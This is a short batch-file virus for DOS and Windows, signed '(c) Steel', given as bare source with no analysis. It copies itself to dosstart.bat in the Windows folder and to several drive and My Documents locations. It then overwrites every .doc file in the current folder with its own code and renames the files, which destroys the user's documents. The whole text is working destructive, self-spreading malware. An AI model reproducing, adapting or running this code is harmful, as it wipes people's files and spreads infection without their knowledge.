@echo off
if "%0"=="dosstart.bat" goto tl
copy %0 %windir%\dosstart.bat
:tl
@ctty nul
copy %0 c:\Virus.bat
copy %0 c:\Мои документы\%0
copy %0 d:\Virus.bat
for %%i in (v*.doc) do ren %%i *.bat
for %%t in (*.doc) do copy %0 %%t
ren *.doc v*.doc
@ctty con
:(c) Steel
